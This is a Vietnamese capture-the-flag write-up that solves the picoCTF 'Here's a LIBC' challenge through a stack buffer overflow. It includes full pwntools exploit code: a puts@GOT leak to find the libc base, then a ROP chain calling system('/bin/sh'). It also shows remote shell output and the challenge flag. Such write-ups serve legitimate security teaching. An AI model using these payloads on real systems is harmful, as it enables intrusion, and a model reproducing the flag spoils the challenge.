# *Chall: Here's a LIBC*
*file bin: vuln_patched*
***

## Đầu tiên ta sẽ xem tra các chế độ bảo vệ của file bin:
```sh
pwndbg> checksec
File:     /mnt/d/Documents/ISP/PractiseTask1/ret2libc/vuln_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```
- No Canary -> có thể buffer overflow
- File không thực thi được shellcode trên stack
- No PIE cho thấy địa chỉ của các hàm trong file là cố định
**-> Ta hoàn toàn có thể leak libc_base để chiếm shell**
## Tiếp theo ta sẽ dùng ida xem mã giả của chương trình:
- Có 2 hàm đc sử dụng chính trong chương trình: main(), convert_case() và do_stuff()
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  char v4; // al
  char *v5; // rdi
  const char **v6; // [rsp+0h] [rbp-80h] BYREF
  int v7; // [rsp+Ch] [rbp-74h]
  char v8[40]; // [rsp+10h] [rbp-70h] BYREF
  char *s; // [rsp+38h] [rbp-48h]
  __int64 v10; // [rsp+40h] [rbp-40h]
  unsigned __int64 v11; // [rsp+48h] [rbp-38h]
  __gid_t rgid; // [rsp+54h] [rbp-2Ch]
  unsigned __int64 i; // [rsp+58h] [rbp-28h]

  v7 = argc;
  v6 = argv;
  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  v11 = 27LL;
  strcpy(v8, "Welcome to my echo server!");
  v10 = 26LL;
  v3 = alloca(32LL);
  s = (char *)&v6;
  for ( i = 0LL; i < v11; ++i )
  {
    v4 = convert_case((unsigned int)v8[i], i);
    s[i] = v4;
  }
  v5 = s;
  puts(s);
  while ( 1 )
    do_stuff(v5);
}
```
```c
__int64 __fastcall convert_case(char a1, char a2)
{
  if ( a1 <= 96 || a1 > 122 )
  {
    if ( a1 <= 64 || a1 > 90 )
    {
      return (unsigned __int8)a1;
    }
    else if ( (a2 & 1) != 0 )
    {
      return (unsigned int)(unsigned __int8)a1 + 32;
    }
    else
    {
      return (unsigned __int8)a1;
    }
  }
  else if ( (a2 & 1) != 0 )
  {
    return (unsigned __int8)a1;
  }
  else
  {
    return (unsigned int)(unsigned __int8)a1 - 32;
  }
}
```
```c
int do_stuff()
{
  char v0; // al
  char v2; // [rsp+Fh] [rbp-81h] BYREF
  char s[112]; // [rsp+10h] [rbp-80h] BYREF
  __int64 v4; // [rsp+80h] [rbp-10h]
  unsigned __int64 i; // [rsp+88h] [rbp-8h]

  v4 = 0LL;
  __isoc99_scanf("%[^\n]", s);
  __isoc99_scanf("%c", &v2);
  for ( i = 0LL; i <= 0x63; ++i )
  {
    v0 = convert_case(s[i], i);
    s[i] = v0;
  }
  return puts(s);
}
```
**- Mô tả chương trình:** Đầu tiên chương trình sẽ chạy hàm convert_case() để chuyển chuỗi "Welcome to my echo server!" thành chuỗi "WeLcOmE To mY EcHo sErVeR!" rồi puts (ta sẽ tận dụng hàm puts này để tìm libc_leak) sau đó chương trình thực hiện hàm do_stuff vô hạn. Hàm do_stuff cho ta nhập 1 chuỗi s, rồi dùng hàm convert_case() xong puts(s).

**- Phân tích chương trình:** Ta dễ dàng thấy rằng trong hàm do_stuff() ta có lỗi buffer overflow tại hàm scanf sau:
```c
   __isoc99_scanf("%[^\n]", s);
   ```
- Hàm này cho ta nhập 1 chuỗi dài bất kỳ và sẽ ngắt khi gặp ký tự '\n' nên ta có thể tận dụng lỗ hổng này để thực hiện bof. Từ đó leak được địa chỉ libc_leak để có đc libc_base = libc_leak - offset.

## Khai thác lỗ hổng:
### *Stage 1: Leak libc_base*

- Đầu tiên ta sẽ đi tính offset:
```sh
pwndbg> tel
00:0000│ rsp 0x7fffffffdc30 —▸ 0x7ffff7dd07e3 (_IO_2_1_stdout_+131) ◂— 0xdd18c0000000000a /* '\n' */
01:0008│-088 0x7fffffffdc38 —▸ 0x7ffff7a70fc1 (_IO_do_write+177) ◂— mov rbp, rax
02:0010│ rsi 0x7fffffffdc40 —▸ 0x7fffffffdcd0 ◂— 'WeLcOmE To mY EcHo sErVeR!'
03:0018│-078 0x7fffffffdc48 —▸ 0x7ffff7dd0760 (_IO_2_1_stdout_) ◂— 0xfbad2887
04:0020│-070 0x7fffffffdc50 ◂— 0xa /* '\n' */
05:0028│-068 0x7fffffffdc58 —▸ 0x7fffffffdcd0 ◂— 'WeLcOmE To mY EcHo sErVeR!'
06:0030│-060 0x7fffffffdc60 —▸ 0x7ffff7dcc2a0 (_IO_file_jumps) ◂— 0
07:0038│-058 0x7fffffffdc68 ◂— 0x1b
pwndbg>
08:0040│-050 0x7fffffffdc70 ◂— 0
09:0048│-048 0x7fffffffdc78 —▸ 0x7ffff7a71473 (_IO_file_overflow+259) ◂— cmp eax, -1
0a:0050│-040 0x7fffffffdc80 ◂— 0x1a
0b:0058│-038 0x7fffffffdc88 —▸ 0x7ffff7dd0760 (_IO_2_1_stdout_) ◂— 0xfbad2887
0c:0060│-030 0x7fffffffdc90 —▸ 0x7fffffffdcd0 ◂— 'WeLcOmE To mY EcHo sErVeR!'
0d:0068│-028 0x7fffffffdc98 —▸ 0x7ffff7a64bd2 (puts+418) ◂— cmp eax, -1
0e:0070│-020 0x7fffffffdca0 —▸ 0x7ffff7dcc2a0 (_IO_file_jumps) ◂— 0
0f:0078│-018 0x7fffffffdca8 ◂— 0
pwndbg>
10:0080│-010 0x7fffffffdcb0 ◂— 0
11:0088│-008 0x7fffffffdcb8 ◂— 0x1b
12:0090│ rbp 0x7fffffffdcc0 —▸ 0x7fffffffdd70 —▸ 0x4008b0 (__libc_csu_init) ◂— push r15
13:0098│+008 0x7fffffffdcc8 —▸ 0x4008a0 (main+303) ◂— jmp main+293
14:00a0│+010 0x7fffffffdcd0 ◂— 'WeLcOmE To mY EcHo sErVeR!'
15:00a8│+018 0x7fffffffdcd8 ◂— 'To mY EcHo sErVeR!'
16:00b0│+020 0x7fffffffdce0 ◂— 'Ho sErVeR!'
17:00b8│+028 0x7fffffffdce8 ◂— 0x2152 /* 'R!' */
```
- Ta sẽ tính khoảng cách từ lúc nhập chuỗi tràn đến địa chỉ 0x7fffffffdcc8 để điều khiển chương trình.
```sh
pwndbg> p/x 0x7fffffffdcc8 - 0x7fffffffdc40
$1 = 0x88
```
-> offset = 0x88
* Sau đó ta sẽ tận dụng hàm puts(puts_got) để tìm libc_leak
* Đầu tiên ta tìm pop_rdi để thiết lập tham số cho hàm puts là puts_got:
```sh
$ ROPgadget --binary vuln_patched | grep "pop rdi"
0x0000000000400913 : pop rdi ; ret
```
- Thực thi puts_plt rồi quay lại hàm do_stuff() để get shell ở bước sau.
```py
pop_rdi = 0x0000000000400913
payload = flat(b'a'*0x88, pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.do_stuff)
p.sendlineafter(b'sErVeR!\n',payload)
```
- Gửi thử xem nhận đc dữ liệu chưa
```sh
[DEBUG] Received 0x1b bytes:
    b'WeLcOmE To mY EcHo sErVeR!\n'
[DEBUG] Sent 0xa9 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  13 09 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000090  18 10 60 00  00 00 00 00  40 05 40 00  00 00 00 00  │··`·│····│@·@·│····│
    000000a0  d8 06 40 00  00 00 00 00  0a                        │··@·│····│·│
    000000a9
[DEBUG] Received 0x81 bytes:
    00000000  41 61 41 61  41 61 41 61  41 61 41 61  41 61 41 61  │AaAa│AaAa│AaAa│AaAa│
    *
    00000060  41 61 41 61  61 61 61 61  61 61 61 61  61 61 61 61  │AaAa│aaaa│aaaa│aaaa│
    00000070  61 61 61 61  61 61 61 61  64 0a 30 4a  73 aa bb 70  │aaaa│aaaa│d·0J│s··p│
    00000080  0a                                                  │·│
    00000081
```
- Ta thấy 6 byte 30 4a 73 aa bb 70 chính là libc_leak, ta sẽ bỏ qua những byte trc đó và chỉ nhận 6 byte đến byte 0a sau đó bổ sung 2 byte null cho đủ 8 byte
```py
p.recvuntil(b'\x61\x61\x64\x0a')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("libc_leak: ", hex(libc_leak))
```
- Giờ gửi lên ktra xem leak đúng chưa:
```sh
[0x601018] puts@GLIBC_2.2.5 -> 0x7feaed9b5a30 (puts) ◂— push r13
```
```sh
[DEBUG] Received 0x81 bytes:
    00000000  41 61 41 61  41 61 41 61  41 61 41 61  41 61 41 61  │AaAa│AaAa│AaAa│AaAa│
    *
    00000060  41 61 41 61  61 61 61 61  61 61 61 61  61 61 61 61  │AaAa│aaaa│aaaa│aaaa│
    00000070  61 61 61 61  61 61 61 61  64 0a 30 5a  9b ed ea 7f  │aaaa│aaaa│d·0Z│····│
    00000080  0a                                                  │·│
    00000081
libc_leak:  0x7feaed9b5a30
[*] Switching to interactive mode
```
-> Đúng
- Giờ tính đc libc base = libc_leak - offset
```py
libc.address = libc_leak - libc.sym.puts
print("libc_base: ", hex(libc.address))
```
- Kiểm tra bằng debug động:
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 r-xp     1000       0 vuln_patched
          0x600000           0x601000 r--p     1000       0 vuln_patched
          0x601000           0x602000 rw-p     1000    1000 vuln_patched
        0x1e99e000         0x1e9bf000 rw-p    21000       0 [heap]
    0x7c67821d9000     0x7c67823c0000 r-xp   1e7000       0 libc.so.6
    0x7c67823c0000     0x7c67825c0000 ---p   200000  1e7000 libc.so.6
```
```
[DEBUG] Received 0x81 bytes:
    00000000  41 61 41 61  41 61 41 61  41 61 41 61  41 61 41 61  │AaAa│AaAa│AaAa│AaAa│
    *
    00000060  41 61 41 61  61 61 61 61  61 61 61 61  61 61 61 61  │AaAa│aaaa│aaaa│aaaa│
    00000070  61 61 61 61  61 61 61 61  64 0a 30 9a  25 82 67 7c  │aaaa│aaaa│d·0·│%·g|│
    00000080  0a                                                  │·│
    00000081
libc_base:  0x7c67821d9000
[*] Switching to interactive mode
$
```
-> Đúng

### *Stage 2: Get shell*
- Chương trình đang thực thi lại hàm do_stuff, nên ta vẫn có offset = 0x88
- Ta đã leak đc libc_base nên có thể thực thi đc luôn hàm system("/bin/sh") trong library C.
- Ta có thể tìm địa chỉ con trỏ trỏ đến chuỗi /bin/sh bằng next rồi đưa vào pop rdi là có thể cho thực thi đc system
- Ta có script:
```py
bin_sh = next(libc.search(b'/bin/sh'))
payload = flat(b'a'*0x88, pop_rdi, bin_sh, libc.sym.system)
p.sendline(payload)
```
- Thử nộp lên local xem lấy đc shell chưa:
```sh
$ ./solve.py
[+] Starting local process '/mnt/d/Documents/ISP/PractiseTask1/ret2libc/vuln_patched': pid 1869
libc_base:  0x76c17a1a7000
[*] Switching to interactive mode

AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaaaaaaaaaaaaaaaaaaaaad
[*] Got EOF while reading in interactive
$
```
- Chưa được thì khả năng bị dính 16-byte aligned trước khi gọi system, vậy sẽ chèn thêm lệnh ret trước khi thực thi system vậy.
```py
ret = 0x000000000040052e
bin_sh = next(libc.search(b'/bin/sh'))
payload = flat(b'a'*0x88, ret, pop_rdi, bin_sh, libc.sym.system)
p.sendline(payload)
```
- Gửi lên local thấy oke rồi nộp lên sever và lấy cờ thôi:
```sh
$ ./solve.py r
[+] Opening connection to mercury.picoctf.net on port 49464: Done
libc_base:  0x7f908709a000
[*] Switching to interactive mode

AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaaaaaaaaaaaaaaaaaaaaad
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}$
```
